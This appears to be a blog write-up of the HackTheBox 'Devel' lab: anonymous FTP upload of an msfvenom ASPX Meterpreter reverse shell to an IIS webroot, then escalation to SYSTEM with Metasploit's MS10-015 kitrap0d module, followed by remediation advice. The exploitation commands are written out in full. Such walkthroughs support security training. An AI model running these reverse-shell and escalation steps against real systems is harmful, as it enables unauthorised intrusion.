+++
title = "HackTheBox - Devel Writeup"
date = "2026-04-02"
description = "Exploiting anonymous FTP write access to IIS webroot for initial foothold, then escalating via MS10-015 (CVE-2010-0232)"
tags = ["HackTheBox", "CTF", "Windows", "FTP", "IIS", "MS10-015", "CVE-2010-0232", "Metasploit", "Easy"]
categories = ["HackTheBox"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
| --- | --- |
| Machine | Devel |
| OS | Windows 7 Enterprise SP0 (Build 7600) |
| Difficulty | Easy |
| Category | Retired |
| Vulnerability | Anonymous FTP + MS10-015 (CVE-2010-0232) |

---

## Reconnaissance

### Nmap Scan

```
nmap -sV xxx.xxx.xxx.xxx
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5
```

**Key observations:**

* Port `21/tcp` (FTP) is open — anonymous login possible
* Port `80/tcp` (HTTP) running IIS 7.5 — ASPX execution available
* FTP root and IIS webroot share the same directory — files uploaded via FTP are served by the web server

---

## Exploitation

### Generating the Payload

Create an ASPX reverse shell payload with msfvenom.

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=4444 -f aspx -o devel.aspx
```

### Uploading via Anonymous FTP

```
ftp xxx.xxx.xxx.xxx
# Name: anonymous
# Password: anonymous
put devel.aspx
bye
```

### Starting the Listener

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST xxx.xxx.xxx.xxx
set LPORT 4444
run -j
```

### Triggering the Shell

```
curl http://xxx.xxx.xxx.xxx/devel.aspx
```

A Meterpreter session opens as `IIS APPPOOL\Web`.

```
getuid
# Server username: IIS APPPOOL\Web
```

---

## Privilege Escalation

### Preparing the Session

Move to a writable directory before running privilege escalation modules — many Metasploit local exploits require writing files to disk.

```
cd C:\\windows\\TEMP
background
```

### Identifying Escalation Vectors

```
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

`systeminfo` confirms the target is unpatched:

```
OS Version: 6.1.7600 N/A Build 7600
Hotfix(s): N/A
```

Top candidates returned:

```
exploit/windows/local/ms10_015_kitrap0d     Yes
exploit/windows/local/ms10_092_schelevator  Yes
exploit/windows/local/ms13_053_schlamperei  Yes
```

### Exploiting MS10-015 (kitrap0d)

```
use exploit/windows/local/ms10_015_kitrap0d
set SESSION 1
set LHOST xxx.xxx.xxx.xxx
set LPORT 5555
run
```

```
[+] Process 2160 launched.
[*] Reflectively injecting the DLL into 2160...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 11 opened
```

```
getuid
# Server username: NT AUTHORITY\SYSTEM
```

---

## Flag Retrieval

```
cat C:\\Users\\babis\\Desktop\\user.txt.txt
cat C:\\Users\\Administrator\\Desktop\\root.txt.txt
```

---

## Summary

| Step | Tool / Command |
| --- | --- |
| Port scan | `nmap -sV` |
| Payload generation | `msfvenom` ASPX reverse shell |
| Initial foothold | Anonymous FTP upload → curl to trigger |
| Privilege escalation | Metasploit `ms10_015_kitrap0d` |
| Result | NT AUTHORITY\SYSTEM |

### Key Takeaways

* FTP anonymous write access to the IIS webroot is a critical misconfiguration — any uploaded ASPX file is immediately executable via the web server
* Moving to `C:\windows\TEMP` before running local exploit modules prevents write failures
* Windows 7 Build 7600 with no hotfixes is trivially exploitable via multiple public kernel vulnerabilities
* `local_exploit_suggester` is most reliable on x86 targets — results on x64 are less accurate

### Remediation

* Disable anonymous FTP write access or isolate FTP root from the webroot entirely
* Apply all available Windows updates, particularly KB979682 (MS10-015)
* Run IIS application pools under a dedicated low-privilege account, not a shared identity
